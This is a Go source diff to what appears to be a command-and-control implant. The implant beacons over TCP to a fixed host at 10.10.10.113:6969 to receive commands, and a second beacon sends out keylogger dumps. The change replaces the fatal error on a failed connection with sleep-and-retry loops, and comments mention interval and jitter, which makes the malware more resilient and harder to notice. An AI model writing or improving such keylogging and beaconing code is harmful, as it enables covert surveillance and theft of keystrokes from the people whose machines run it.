@@ -66,9 +66,12 @@ func main() {
 
 	for {
 		//First beacon for reqular commands
+	RETRY:
 		beacon, err := net.Dial("tcp", "10.10.10.113:6969")
 		if err != nil {
-			log.Fatalln(err) // maybe try diff IP
+			// log.Fatalln(err) // maybe try diff IP
+			time.Sleep(time.Second * time.Duration(5)) // interval and jitter here
+			goto RETRY
 		}
 		ipAddress := beacon.LocalAddr().(*net.TCPAddr)
 		ip := fmt.Sprintf("%v", ipAddress)
@@ -124,9 +127,12 @@ func main() {
 		time.Sleep(time.Second * time.Duration(5)) // interval and jitter here
 
 		//Second beacon for keylog dump
+	KEYRETRY:
 		keybeacon, err := net.Dial("tcp", "10.10.10.113:6969")
 		if err != nil {
-			log.Fatalln(err) // maybe try diff IP
+			// log.Fatalln(err) // maybe try diff IP
+			time.Sleep(time.Second * time.Duration(5)) // interval and jitter here
+			goto KEYRETRY
 		}
 		keyipAddress := keybeacon.LocalAddr().(*net.TCPAddr)
 		keyip := fmt.Sprintf("%v", keyipAddress)
